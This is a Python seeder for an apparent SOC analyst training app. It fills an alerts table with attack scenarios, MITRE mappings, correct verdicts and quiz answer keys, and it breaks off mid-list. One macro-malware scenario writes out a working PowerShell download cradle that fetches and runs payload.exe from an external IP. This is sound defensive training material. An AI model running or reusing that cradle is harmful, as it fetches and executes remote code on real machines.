"""
Database seeder — populates the alerts table with the 15 training scenarios.
============================================================================
Each scenario is a dictionary that includes:
- Basic metadata: title, description, severity, alert_type, difficulty
- Indicators: source_ip, destination_ip, file_hash, cve_id (where relevant)
- MITRE ATT&CK mapping: tactic + technique id + technique name
- Evidence "details" (JSON): sender, recipient, security checks, file info, etc.
- The "correct answer": correct_verdict (True/False Positive),
  correct_action (close / escalate_l2 / escalate_manager), and an
  educational explanation shown after the analyst submits a decision.
- Quiz "questions" (JSON): per-alert analysis questions with feedback.

Scenarios cover the major ATT&CK tactics: Initial Access, Execution,
Persistence, Credential Access, Lateral Movement, Collection,
Command and Control, Exfiltration, and Impact.

The function seed_database() is called by app.py the first time the
application is run on an empty database.
"""

from datetime import datetime, timedelta
import random
import json
from database.db import get_db


def seed_database():
    """Insert the 15 training scenarios into an empty alerts table."""
    alerts = [
        {
            "title": "Email Marked as Phishing after Delivery",
            "description": "The email was classified as phishing post-delivery after an automated analysis. If the email is spoofed or contains any suspicious links or files, it must be deeply investigated.",
            "severity": "Medium",
            "alert_type": "Phishing",
            "source_ip": "198.51.100.23",
            "destination_ip": "10.0.3.10",
            "mitre_tactic": "Initial Access",
            "mitre_technique_id": "T1566",
            "mitre_technique_name": "Phishing",
            "details": json.dumps({
                "subject": "Important Update: Microsoft Teams Pricing Increase",
                "body_keywords": "600% price increase; urgent notice; download the report; read the details;",
                "sender": "Microsoft Support <support@micros0ft-update.com>",
                "recipient": "Eddie Huffman, IT Manager <e.huffman@company.thm>",
                "security_checks": "SPF/Fail; DKIM/Fail;",
                "attached_urls": "None",
                "attached_files": "REPORT.rar"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "escalate_l2",
            "correct_explanation": "The sender domain is spoofed (micros0ft-update.com instead of microsoft.com). SPF and DKIM both failed, confirming the email is not from Microsoft. The .rar attachment is suspicious. This is a confirmed phishing attempt that needs L2 investigation.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "Look at the sender address carefully. Is this a legitimate Microsoft email?",
                    "options": [
                        {"text": "Yes — it says Microsoft Support", "correct": False, "feedback": "Look again! The domain is 'micros0ft-update.com' — notice the zero instead of 'o' and the fake domain. This is a spoofed sender."},
                        {"text": "No — the domain is spoofed (micros0ft with a zero)", "correct": True, "feedback": "Correct! The domain 'micros0ft-update.com' uses a zero instead of 'o'. This is a classic typosquatting technique. Combined with SPF/DKIM failures, this confirms it's spoofed."},
                        {"text": "Can't tell from this information", "correct": False, "feedback": "You can tell! The domain 'micros0ft-update.com' is clearly not microsoft.com. Always check the actual domain, not just the display name."}
                    ]
                },
                {
                    "id": "q2",
                    "question": "SPF and DKIM both show 'Fail'. What does this tell you?",
                    "options": [
                        {"text": "The email server had a temporary error", "correct": False, "feedback": "No. SPF/DKIM failures mean the sending server is NOT authorised to send on behalf of that domain. This confirms the email is forged."},
                        {"text": "The email is not actually from the claimed sender domain", "correct": True, "feedback": "Correct! SPF verifies the sending server is authorised, and DKIM verifies the email wasn't tampered with. Both failing confirms this email is forged."},
                        {"text": "This is normal for external emails", "correct": False, "feedback": "Legitimate companies like Microsoft always have SPF and DKIM properly configured. Both failing is a strong indicator of a spoofed email."}
                    ]
                },
                {
                    "id": "q3",
                    "question": "What is the correct verdict and action for this alert?",
                    "options": [
                        {"text": "False Positive — Close it, Microsoft sometimes sends updates like this", "correct": False, "feedback": "Wrong! All evidence points to phishing: spoofed domain, failed SPF/DKIM, urgency keywords, .rar attachment. This is a True Positive."},
                        {"text": "True Positive — Escalate to L2 for deeper investigation of the attachment", "correct": True, "feedback": "Correct! This is confirmed phishing. Escalate to L2 to analyse the .rar attachment, check if the recipient opened it, and block the sender domain."},
                        {"text": "True Positive — Close it, the email gateway already caught it", "correct": False, "feedback": "Not enough! The email was delivered before being flagged. You need to check if the recipient opened it or downloaded the attachment. Escalate to L2."}
                    ]
                }
            ]),
        },
        {
            "title": "Suspicious Login from Foreign IP",
            "description": "Multiple failed login attempts detected from an external IP targeting a privileged account on the corporate VPN. The IP is associated with a known Tor exit node. After 15 failed attempts, a successful login was recorded.",
            "severity": "High",
            "alert_type": "Brute Force",
            "source_ip": "185.220.101.34",
            "destination_ip": "10.0.1.50",
            "mitre_tactic": "Initial Access",
            "mitre_technique_id": "T1110",
            "mitre_technique_name": "Brute Force",
            "details": json.dumps({
                "target_account": "admin@corp-vpn.company.thm",
                "failed_attempts": "15 attempts in 5 minutes",
                "successful_login": "Yes — at 03:42 AM",
                "source_location": "Tor Exit Node (Netherlands)",
                "mfa_status": "Not enabled on this account",
                "normal_login_hours": "08:00 — 18:00 local time",
                "previous_logins": "All previous logins from Ireland (10.0.x.x range)"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "escalate_manager",
            "correct_explanation": "A successful login from a Tor exit node at 3:42 AM on an account without MFA, after 15 failed attempts, is a confirmed account compromise. This needs immediate escalation to the Manager for incident response — password reset, session termination, and forensic investigation.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "The login succeeded at 03:42 AM from a Tor exit node. What does this suggest?",
                    "options": [
                        {"text": "The admin is working late from a VPN", "correct": False, "feedback": "Unlikely! Normal login hours are 08:00-18:00, previous logins are all from Ireland, and Tor is used to hide identity. This is not normal behaviour."},
                        {"text": "The account has been compromised through brute force", "correct": True, "feedback": "Correct! 15 failed attempts followed by a success from Tor at 3:42 AM = the attacker cracked the password. No MFA makes it even worse."},
                        {"text": "This is an automated system check", "correct": False, "feedback": "System checks don't come from Tor exit nodes and don't fail 15 times first. This is a brute force attack."}
                    ]
                },
                {
                    "id": "q2",
                    "question": "MFA is not enabled on this account. How does this affect the severity?",
                    "options": [
                        {"text": "It doesn't matter — the password was compromised either way", "correct": False, "feedback": "It matters a lot! With MFA, even a compromised password wouldn't grant access. Without MFA, the attacker has full access right now."},
                        {"text": "It makes this much more critical — the attacker has full access with just the password", "correct": True, "feedback": "Correct! No MFA means the compromised password gives the attacker complete access. This needs immediate escalation to the Manager for incident response."},
                        {"text": "MFA wouldn't have helped against brute force", "correct": False, "feedback": "Wrong! MFA is specifically designed to prevent this. Even if the attacker guesses the password, they can't pass the second factor."}
                    ]
                }
            ]),
        },
        {
            "title": "Malware Hash Detected on Endpoint",
            "description": "EDR flagged a suspicious executable on a workstation. The file hash matches a known variant of the Emotet trojan. The file was found in the Downloads folder and was executed by the user.",
            "severity": "Critical",
            "alert_type": "Malware",
            "source_ip": "10.0.2.142",
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "mitre_tactic": "Execution",
            "mitre_technique_id": "T1204",
            "mitre_technique_name": "User Execution",
            "details": json.dumps({
                "hostname": "WS-PC-0142 (Finance Department)",
                "user": "Sarah Mitchell <s.mitchell@company.thm>",
                "file_name": "Invoice_Q4_2024.exe",
                "file_location": "C:\\Users\\s.mitchell\\Downloads\\",
                "file_type": "Win32 EXE — PE32 executable",
                "execution_time": "2026-02-20 14:23:00",
                "process_tree": "outlook.exe → chrome.exe → Invoice_Q4_2024.exe",
                "network_connections": "Outbound to 203.0.113.50:443 (C2 server) detected after execution"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "escalate_manager",
            "correct_explanation": "Emotet was executed and has already established a C2 connection. This is a critical incident requiring immediate Manager escalation for endpoint isolation, network containment, and full incident response across the Finance department.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "The process tree shows: outlook.exe → chrome.exe → Invoice_Q4_2024.exe. What does this tell you?",
                    "options": [
                        {"text": "The user downloaded the file from a normal website", "correct": False, "feedback": "Look closer! It starts with Outlook (email client). The user received an email, clicked a link that opened Chrome, which downloaded and ran the malware."},
                        {"text": "The user received a phishing email, clicked a link, and the malware was downloaded and executed", "correct": True, "feedback": "Correct! The chain Outlook → Chrome → malicious .exe shows a phishing email led to malware download. This is a textbook Emotet infection chain."},
                        {"text": "The antivirus caught it before it could run", "correct": False, "feedback": "No — the file WAS executed and network connections to a C2 server were detected. The malware is active."}
                    ]
                },
                {
                    "id": "q2",
                    "question": "Network connections show outbound traffic to a C2 server after execution. What is the priority?",
                    "options": [
                        {"text": "Monitor the connection to gather intelligence", "correct": False, "feedback": "Too risky! Emotet spreads laterally and downloads additional malware. Every second connected means more damage."},
                        {"text": "Immediately isolate the endpoint and escalate to Manager for incident response", "correct": True, "feedback": "Correct! Active C2 communication means the attacker has control. Isolate immediately and escalate to Manager. Check other Finance machines for lateral movement."},
                        {"text": "Run a virus scan and wait for results", "correct": False, "feedback": "A scan takes too long when there's active C2 communication. The attacker is actively controlling this machine. Isolate first, scan later."}
                    ]
                }
            ]),
        },
        {
            "title": "Unusual Outbound Traffic to Known C2 Server",
            "description": "Network monitoring detected recurring HTTPS connections from an internal host to an IP listed as a Command and Control server associated with APT29. Connections occur at regular 60-second intervals with small encrypted payloads.",
            "severity": "Critical",
            "alert_type": "C2 Communication",
            "source_ip": "10.0.2.88",
            "destination_ip": "203.0.113.50",
            "mitre_tactic": "Command and Control",
            "mitre_technique_id": "T1071",
            "mitre_technique_name": "Application Layer Protocol",
            "details": json.dumps({
                "hostname": "WS-DEV-088 (Development Team)",
                "user": "James O'Brien <j.obrien@company.thm>",
                "connection_frequency": "Every 60 seconds (beaconing pattern)",
                "data_volume": "Small payloads (~2KB per request)",
                "destination_info": "203.0.113.50 — Known APT29 C2 infrastructure",
                "protocol": "HTTPS/443 (encrypted)",
                "duration": "Active for approximately 3 hours",
                "firewall_action": "Allowed — destination not on blocklist"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "escalate_manager",
            "correct_explanation": "Regular 60-second beaconing to a known APT29 C2 server is a confirmed compromise. APT29 is a nation-state threat actor. This requires immediate Manager escalation for endpoint isolation, network forensics, and potential engagement with national CSIRT.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "Connections happen exactly every 60 seconds. What type of behaviour is this?",
                    "options": [
                        {"text": "Normal HTTPS traffic to a cloud service", "correct": False, "feedback": "Normal traffic doesn't occur at exact regular intervals. This precise timing is a signature of malware beaconing."},
                        {"text": "C2 beaconing — the malware is checking in with its command server at regular intervals", "correct": True, "feedback": "Correct! Regular interval connections (beaconing) is how malware maintains communication with C2. The 60-second interval allows the attacker to send commands and receive data."},
                        {"text": "A software update check", "correct": False, "feedback": "Update checks don't connect to known APT29 infrastructure. This is malicious beaconing."}
                    ]
                },
                {
                    "id": "q2",
                    "question": "The C2 IP is associated with APT29. How does this affect your response?",
                    "options": [
                        {"text": "Treat it like any other malware incident", "correct": False, "feedback": "APT29 is a sophisticated nation-state group. They likely have persistence mechanisms, lateral movement, and data exfiltration. This requires escalated incident response."},
                        {"text": "Escalate to Manager immediately — this is a nation-state level threat requiring full incident response", "correct": True, "feedback": "Correct! APT29 (Cozy Bear) is a Russian state-sponsored group. This requires Manager-level escalation, potential law enforcement notification, and comprehensive incident response."},
                        {"text": "Just block the IP and move on", "correct": False, "feedback": "Blocking one IP won't stop APT29. They use multiple C2 servers and have likely established persistence. A full investigation is needed."}
                    ]
                }
            ]),
        },
        {
            "title": "Large Data Transfer to External IP",
            "description": "DLP system flagged an unusually large data transfer from the file server to an external IP address over HTTPS. The transfer occurred outside business hours. The destination IP is registered to a cloud hosting provider in Eastern Europe.",
            "severity": "Critical",
            "alert_type": "Data Exfiltration",
            "source_ip": "10.0.1.30",
            "destination_ip": "91.234.56.78",
            "mitre_tactic": "Exfiltration",
            "mitre_technique_id": "T1041",
            "mitre_technique_name": "Exfiltration Over C2 Channel",
            "details": json.dumps({
                "hostname": "FILE-SRV-01 (Corporate File Server)",
                "data_volume": "4.7 GB transferred",
                "transfer_time": "02:47 AM — 03:15 AM",
                "destination_info": "91.234.56.78 — Cloud hosting provider (Romania)",
                "protocol": "HTTPS/443",
                "files_accessed": "Accessed /Finance/Payroll/ and /HR/Employee_Records/",
                "user_account": "svc_backup (service account)",
                "normal_backup_destination": "10.0.5.100 (internal backup server)"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "escalate_manager",
            "correct_explanation": "4.7 GB of sensitive HR and Payroll data transferred to Romania at 2:47 AM using a service account that normally backs up to an internal server. This is confirmed data exfiltration requiring immediate Manager escalation for breach response and regulatory notification.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "The transfer used the svc_backup account but went to an external IP instead of the internal backup server. What does this suggest?",
                    "options": [
                        {"text": "The backup schedule was changed", "correct": False, "feedback": "Backup changes don't redirect 4.7GB of HR/Payroll data to Romania. The attacker compromised the service account to exfiltrate data."},
                        {"text": "The service account was compromised and used to steal data", "correct": True, "feedback": "Correct! The attacker compromised the backup service account and redirected data to their own server. This is a classic technique to avoid detection."},
                        {"text": "IT moved backups to a cloud provider", "correct": False, "feedback": "IT wouldn't use an unknown Romanian hosting provider. The normal backup goes to 10.0.5.100. This is data theft."}
                    ]
                },
                {
                    "id": "q2",
                    "question": "The files accessed include Payroll and Employee Records. How does this affect the incident?",
                    "options": [
                        {"text": "It's just regular files, no special concern", "correct": False, "feedback": "Payroll and Employee Records contain PII (Personal Identifiable Information), salaries, bank details. This is a data breach with regulatory implications."},
                        {"text": "This is a data breach involving personal data — requires Manager escalation and potential regulatory notification", "correct": True, "feedback": "Correct! Under GDPR, this is a personal data breach requiring notification to the Data Protection Commission within 72 hours. Manager must be involved immediately."}
                    ]
                }
            ]),
        },
        {
            "title": "Web Scanning of Corporate Resources",
            "description": "IDS detected automated web vulnerability scanning against corporate web applications from an external IP address. The scan includes common vulnerability checks but no successful exploitation has been detected.",
            "severity": "Low",
            "alert_type": "Reconnaissance",
            "source_ip": "192.0.2.100",
            "destination_ip": "10.0.0.5",
            "mitre_tactic": "Reconnaissance",
            "mitre_technique_id": "T1595",
            "mitre_technique_name": "Active Scanning",
            "details": json.dumps({
                "hostname": "WEB-SRV-01 (Corporate Website)",
                "scan_tool": "Detected as Nmap/Nikto automated scan",
                "requests_count": "2,847 requests in 10 minutes",
                "paths_scanned": "/admin, /wp-login, /phpmyadmin, /.env, /api/v1/users",
                "source_info": "192.0.2.100 — Known scanning service (Shodan/Censys range)",
                "exploitation_detected": "No successful exploitation attempts",
                "waf_status": "WAF is active and blocking malicious requests"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "close",
            "correct_explanation": "This is automated internet scanning which is common and expected. The WAF is blocking malicious requests and no exploitation was successful. Log the source IP, verify WAF rules are up to date, and close. No escalation needed.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "The source IP belongs to a known scanning service and no exploitation succeeded. What is the appropriate action?",
                    "options": [
                        {"text": "Escalate to Manager — any scanning is a serious threat", "correct": False, "feedback": "Automated scanning is constant internet noise. With WAF active and no exploitation, this doesn't warrant Manager escalation. Don't waste senior resources on routine scanning."},
                        {"text": "True Positive but close it — this is routine scanning, WAF is handling it", "correct": True, "feedback": "Correct! Internet-facing servers get scanned constantly. The WAF is working, no exploitation succeeded. Mark as True Positive (it IS scanning), but close as handled. Verify WAF rules are current."},
                        {"text": "False Positive — ignore it completely", "correct": False, "feedback": "It's not a False Positive — scanning IS happening. But it's routine and handled by the WAF. The correct verdict is True Positive with close action."}
                    ]
                }
            ]),
        },
        {
            "title": "Fast Beaconing to Untrusted Domain",
            "description": "DNS monitoring detected rapid DNS queries to a newly registered domain. The query pattern suggests potential DNS-based C2 communication, but further analysis shows the domain belongs to a new CDN service used by a recently deployed internal application.",
            "severity": "High",
            "alert_type": "Suspicious DNS",
            "source_ip": "10.0.3.22",
            "destination_ip": "10.0.0.2",
            "mitre_tactic": "Command and Control",
            "mitre_technique_id": "T1071",
            "mitre_technique_name": "Application Layer Protocol",
            "details": json.dumps({
                "hostname": "APP-SRV-03 (Internal Application Server)",
                "domain_queried": "cdn-edge-node.fastserve.io",
                "domain_age": "Registered 14 days ago",
                "query_frequency": "Every 5 seconds",
                "dns_response": "Valid A records pointing to Cloudflare IPs",
                "internal_app": "New CRM deployment by IT team (deployed last week)",
                "it_confirmation": "IT team confirmed this domain is the CDN for the new CRM app",
                "virustotal_result": "0 detections, clean domain"
            }),
            "correct_verdict": "False Positive",
            "correct_action": "close",
            "correct_explanation": "IT confirmed this domain is the CDN for a newly deployed CRM application. The domain resolves to Cloudflare, VirusTotal shows 0 detections. This is a False Positive — the alert triggered because the domain is new, but it's legitimate.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "The domain is only 14 days old and shows rapid queries. However, IT confirmed it's their new CRM's CDN. What is the correct verdict?",
                    "options": [
                        {"text": "True Positive — new domains with rapid queries are always suspicious", "correct": False, "feedback": "Not always! Context matters. IT confirmed this is their CDN, VirusTotal shows 0 detections, and it resolves to Cloudflare. The age triggered the alert, but it's legitimate."},
                        {"text": "False Positive — IT confirmed the domain is legitimate for the new CRM", "correct": True, "feedback": "Correct! Always verify with context. IT confirmed the domain, VT is clean, Cloudflare IPs are legitimate. The alert triggered due to the new domain, but it's a False Positive. Close it and whitelist the domain."},
                        {"text": "Escalate to be safe — you can never trust new domains", "correct": False, "feedback": "Escalating confirmed legitimate traffic wastes senior analysts' time. Trust the evidence: IT confirmation + clean VT + Cloudflare IPs = False Positive."}
                    ]
                }
            ]),
        },
        {
            "title": "Ransomware Indicators on File Server",
            "description": "File integrity monitoring detected rapid file extension changes on the shared drive. Hundreds of files have been renamed with the '.encrypted' extension in under 2 minutes. A ransom note has been created in the root directory.",
            "severity": "Critical",
            "alert_type": "Ransomware",
            "source_ip": "10.0.2.99",
            "destination_ip": "10.0.1.30",
            "mitre_tactic": "Impact",
            "mitre_technique_id": "T1486",
            "mitre_technique_name": "Data Encrypted for Impact",
            "details": json.dumps({
                "hostname_source": "WS-ACC-099 (Accounting Department)",
                "hostname_target": "FILE-SRV-01 (Corporate File Server)",
                "user": "Mike Chen <m.chen@company.thm>",
                "files_affected": "527 files encrypted in 2 minutes",
                "file_extensions": ".docx, .xlsx, .pdf → .encrypted",
                "ransom_note": "README_DECRYPT.txt found in root of shared drive",
                "ransom_demand": "5 BTC to decrypt files",
                "lateral_movement": "SMB connections from WS-ACC-099 to FILE-SRV-01 detected",
                "initial_vector": "Suspicious macro-enabled document opened 15 minutes before encryption started"
            }),
            "correct_verdict": "True Positive",
            "correct_action": "escalate_manager",
            "correct_explanation": "Active ransomware encryption with 527 files affected. Both the source workstation and file server must be immediately isolated. Manager escalation is critical for incident response, backup verification, and potential business continuity decisions.",
            "questions": json.dumps([
                {
                    "id": "q1",
                    "question": "527 files encrypted in 2 minutes with a ransom note. This attack is ACTIVE. What is your FIRST action?",
                    "options": [
                        {"text": "Investigate which files were encrypted", "correct": False, "feedback": "No time! Files are being encrypted RIGHT NOW. Every second you investigate, more files are lost. Isolate first!"},
                        {"text": "Immediately isolate both the workstation and file server from the network", "correct": True, "feedback": "Correct! IMMEDIATE isolation stops the encryption from spreading. Disconnect WS-ACC-099 and FILE-SRV-01 from the network, then escalate to Manager."},
                        {"text": "Contact Mike Chen to ask what he did", "correct": False, "feedback": "There's no time for user interviews during an active attack. Isolate first, investigate later."}
                    ]
                },
                {
                    "id": "q2",
                    "question": "The ransom demands 5 BTC. Should the company pay?",
                    "options": [
                        {"text": "Yes — it's the fastest way to recover", "correct": False, "feedback": "Never pay! Payment funds criminal operations and there's no guarantee of decryption. Many organisations pay and never receive keys."},
                        {"text": "No — check for offline backups and escalate to Manager for incident response", "correct": True, "feedback": "Correct! Check offline backups, escalate to Manager, engage incident response team. Consider law enforcement notification. Never pay the ransom."}
                    ]
                }
            ]),
        },
    ]

    conn = get_db()
    base_time = datetime.utcnow() - timedelta(hours=24)

    # Add difficulty to existing alerts
    difficulty_map = {
        "Email Marked as Phishing after Delivery": "Medium",
        "Suspicious Login from Foreign IP": "Medium",
        "Malware Hash Detected on Endpoint": "Hard",
        "Unusual Outbound Traffic to Known C2 Server": "Hard",
        "Large Data Transfer to External IP": "Hard",
        "Web Scanning of Corporate Resources": "Easy",
        "Fast Beaconing to Untrusted Domain": "Medium",
        "Ransomware Indicators on File Server": "Hard",
    }
    for a in alerts:
        a["difficulty"] = difficulty_map.get(a["title"], "Medium")

    # ============ 7 NEW SCENARIOS ============
    alerts.append({
        "title": "SQL Injection Attempt on Web Application",
        "description": "WAF detected multiple SQL injection payloads targeting the login form of the customer portal. The source IP sent 47 malicious requests in 3 minutes.",
        "severity": "High",
        "alert_type": "Web Attack",
        "difficulty": "Medium",
        "source_ip": "203.0.113.88",
        "mitre_tactic": "Initial Access",
        "mitre_technique_id": "T1190",
        "mitre_technique_name": "Exploit Public-Facing Application",
        "details": json.dumps({"Target URL": "https://portal.company.com/login", "Attack Type": "SQL Injection (UNION-based)", "Payloads Detected": "47 in 3 minutes", "Source IP": "203.0.113.88", "Source Country": "China", "WAF Action": "Blocked (all requests)", "Successful Exploitation": "None detected", "User Accounts Compromised": "0"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_l2",
        "correct_explanation": "Confirmed SQL injection attempt. WAF blocked all payloads but the source IP should be investigated and permanently blocked. Escalate to L2 for IP reputation analysis and firewall rule update.",
        "questions": json.dumps([
            {"id": "q1", "question": "The WAF blocked all requests. Should we still escalate?",
             "options": [
                 {"text": "Yes — blocking doesn't mean no further action needed", "correct": True, "feedback": "Correct. The attacker may try again with different techniques. We need to block the IP and investigate."},
                 {"text": "No — WAF handled it, we can close", "correct": False, "feedback": "Incorrect. Blocking is reactive. We need proactive measures like permanent IP blocking and checking for other attack vectors."}
             ]}
        ]),
    })
    alerts.append({
        "title": "Unauthorized USB Device Connected",
        "description": "Endpoint protection detected an unauthorized USB mass storage device connected to a workstation in the Finance department after business hours.",
        "severity": "Medium",
        "alert_type": "Insider Threat",
        "difficulty": "Medium",
        "source_ip": "10.0.5.22",
        "mitre_tactic": "Collection",
        "mitre_technique_id": "T1025",
        "mitre_technique_name": "Data from Removable Media",
        "details": json.dumps({"Workstation": "FIN-WS-022", "Department": "Finance", "USB Device": "SanDisk Ultra 64GB", "Device Serial": "4C530001221208", "Time Connected": "21:47 (after hours)", "User Logged In": "john.smith", "Files Accessed": "Q4_Financials.xlsx, Payroll_2026.csv", "DLP Alert": "Triggered — sensitive data copied"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_manager",
        "correct_explanation": "Unauthorized USB in Finance after hours with DLP alert on sensitive files is a serious insider threat indicator. Escalate to Manager for HR involvement and forensic investigation.",
        "questions": json.dumps([
            {"id": "q1", "question": "What makes this more suspicious than a regular USB connection?",
             "options": [
                 {"text": "After hours + Finance dept + DLP alert on sensitive files", "correct": True, "feedback": "Correct. The combination of timing, department, and sensitive file access creates a high-risk insider threat profile."},
                 {"text": "USB devices are always suspicious", "correct": False, "feedback": "Not always. Context matters — department, timing, and what files were accessed determine the risk level."}
             ]}
        ]),
    })
    alerts.append({
        "title": "DDoS Attack on Public Web Server",
        "description": "Network monitoring detected a volumetric DDoS attack targeting the company's public website. Traffic surged from 500 Mbps to 12 Gbps in 2 minutes.",
        "severity": "High",
        "alert_type": "Denial of Service",
        "difficulty": "Easy",
        "source_ip": "Multiple",
        "mitre_tactic": "Impact",
        "mitre_technique_id": "T1498",
        "mitre_technique_name": "Network Denial of Service",
        "details": json.dumps({"Target": "www.company.com (203.0.113.10)", "Attack Type": "UDP Flood + SYN Flood", "Peak Traffic": "12 Gbps", "Normal Traffic": "500 Mbps", "Source IPs": "15,000+ (botnet)", "Duration": "Ongoing (started 14:32)", "CDN Status": "Cloudflare mitigation active", "Website Status": "Intermittent availability"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_manager",
        "correct_explanation": "Active DDoS attack affecting business availability. Escalate to Manager to coordinate with ISP, activate full DDoS mitigation, and communicate with stakeholders.",
        "questions": json.dumps([
            {"id": "q1", "question": "CDN is already mitigating. What's the next priority?",
             "options": [
                 {"text": "Notify management and coordinate broader response", "correct": True, "feedback": "Correct. DDoS affects business operations — management needs to know for customer communication and potential ISP escalation."},
                 {"text": "Just monitor and wait for CDN to handle it", "correct": False, "feedback": "CDN alone may not be sufficient for 12 Gbps. Active coordination with ISP and management is needed."}
             ]}
        ]),
    })
    alerts.append({
        "title": "Credential Stuffing Attack on VPN Portal",
        "description": "Authentication logs show 2,300 failed login attempts across 180 different usernames on the corporate VPN portal within 15 minutes, with 3 successful logins from the same IP range.",
        "severity": "Critical",
        "alert_type": "Credential Attack",
        "difficulty": "Medium",
        "source_ip": "198.51.100.0/24",
        "mitre_tactic": "Credential Access",
        "mitre_technique_id": "T1110",
        "mitre_technique_name": "Brute Force",
        "details": json.dumps({"Target": "vpn.company.com", "Failed Attempts": "2,300 in 15 minutes", "Usernames Tried": "180 unique accounts", "Successful Logins": "3 accounts", "Compromised Accounts": "a.williams, m.chen, r.patel", "Source IP Range": "198.51.100.0/24", "Geo Location": "Russia", "MFA Status": "Not enforced on VPN", "Post-Login Activity": "VPN tunnel established, internal RDP observed"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_manager",
        "correct_explanation": "Critical — 3 accounts are compromised with active internal access. Escalate to Manager immediately to disable compromised accounts, terminate VPN sessions, and enforce MFA.",
        "questions": json.dumps([
            {"id": "q1", "question": "3 accounts logged in successfully. What's the immediate priority?",
             "options": [
                 {"text": "Disable those 3 accounts and kill their VPN sessions immediately", "correct": True, "feedback": "Correct. Active compromised sessions with internal RDP access is a critical threat. Immediate containment is needed."},
                 {"text": "Monitor the sessions to gather more intelligence", "correct": False, "feedback": "Too risky. Active RDP to internal systems means lateral movement is happening now. Containment first, investigation after."}
             ]}
        ]),
    })
    alerts.append({
        "title": "Suspicious PowerShell Execution via Macro",
        "description": "EDR detected a Word document triggering a PowerShell download cradle. The macro executed a Base64-encoded command that downloaded and ran an executable from an external server.",
        "severity": "Critical",
        "alert_type": "Malware Delivery",
        "difficulty": "Hard",
        "source_ip": "10.0.3.88",
        "file_hash": "7a2b1f4c8e9d3a5b6c0f1e2d4a8b7c9e",
        "mitre_tactic": "Execution",
        "mitre_technique_id": "T1059",
        "mitre_technique_name": "Command and Scripting Interpreter",
        "details": json.dumps({"Document": "Invoice_March2026.docm", "Received Via": "Email from supplier-updates@legit-vendor.com", "Macro Action": "PowerShell -enc [Base64 blob]", "Decoded Command": "IEX(New-Object Net.WebClient).DownloadString('http://185.234.72.11/payload.exe')", "Payload Downloaded": "Yes — payload.exe (340KB)", "Payload Hash": "7a2b1f4c8e9d3a5b6c0f1e2d4a8b7c9e", "C2 Communication": "Detected — beacon to 185.234.72.11:443", "User": "lisa.johnson (Accounting)", "Workstation": "ACC-WS-088"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_manager",
        "correct_explanation": "Active malware infection via macro. Payload executed and C2 communication detected. Escalate to Manager for immediate endpoint isolation, network containment, and incident response.",
        "questions": json.dumps([
            {"id": "q1", "question": "The payload already executed. What does this change about our response?",
             "options": [
                 {"text": "This is now an active incident — isolate the endpoint immediately", "correct": True, "feedback": "Correct. Post-execution with active C2 means the attacker has a foothold. Immediate isolation prevents lateral movement."},
                 {"text": "Run a full antivirus scan first to confirm", "correct": False, "feedback": "Too slow. C2 is active — every second allows potential data theft or lateral movement. Isolate first, scan after."}
             ]}
        ]),
    })
    alerts.append({
        "title": "DNS Tunneling Detected",
        "description": "DNS monitoring detected unusually long and high-frequency DNS queries to a single domain, suggesting DNS tunneling for data exfiltration or C2 communication.",
        "severity": "High",
        "alert_type": "Exfiltration",
        "difficulty": "Hard",
        "source_ip": "10.0.4.55",
        "destination_ip": "198.51.100.53",
        "mitre_tactic": "Exfiltration",
        "mitre_technique_id": "T1048",
        "mitre_technique_name": "Exfiltration Over Alternative Protocol",
        "details": json.dumps({"Source Host": "DEV-WS-055", "Query Domain": "x7f2a.data-sync-cdn.net", "Query Frequency": "120 queries/minute (normal: 2-5)", "Average Query Length": "180 characters (normal: 30-50)", "Query Type": "TXT records", "Domain Age": "3 days", "Domain Registration": "Privacy-protected, registered in Panama", "Total Data Volume": "~45MB estimated via DNS", "Duration": "Active for 6 hours"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_manager",
        "correct_explanation": "DNS tunneling is a sophisticated exfiltration technique. 45MB over 6 hours via DNS TXT records to a 3-day-old domain is highly suspicious. Escalate to Manager for forensic analysis and network blocking.",
        "questions": json.dumps([
            {"id": "q1", "question": "Why is DNS tunneling particularly dangerous?",
             "options": [
                 {"text": "DNS traffic is rarely blocked or inspected by firewalls", "correct": True, "feedback": "Correct. Most firewalls allow DNS (port 53) by default. Attackers abuse this trusted protocol to bypass security controls."},
                 {"text": "DNS is faster than HTTP for data transfer", "correct": False, "feedback": "DNS is actually slower. The danger is that it bypasses most security controls since DNS is almost never blocked."}
             ]}
        ]),
    })
    alerts.append({
        "title": "Scheduled Task Created by Unknown Process",
        "description": "Windows Event Log shows a new scheduled task 'SystemHealthCheck' created by a process running from the Temp directory. The task is configured to run at startup with SYSTEM privileges.",
        "severity": "Medium",
        "alert_type": "Persistence",
        "difficulty": "Easy",
        "source_ip": "10.0.2.99",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1053",
        "mitre_technique_name": "Scheduled Task/Job",
        "details": json.dumps({"Task Name": "SystemHealthCheck", "Created By": "C:\\Users\\admin\\AppData\\Local\\Temp\\svchost.exe", "Run As": "NT AUTHORITY\\SYSTEM", "Trigger": "At system startup", "Action": "Execute C:\\ProgramData\\.hidden\\beacon.exe", "IT Department Confirmation": "Task is NOT from IT — no such maintenance tool exists", "File beacon.exe": "Not signed, created today, unknown publisher", "Network Activity": "beacon.exe observed connecting to 45.33.32.156:8443"}),
        "correct_verdict": "True Positive",
        "correct_action": "escalate_l2",
        "correct_explanation": "Fake svchost.exe in Temp creating a persistence mechanism with an unsigned beacon executable. Clear malware persistence. Escalate to L2 for endpoint remediation and malware analysis.",
        "questions": json.dumps([
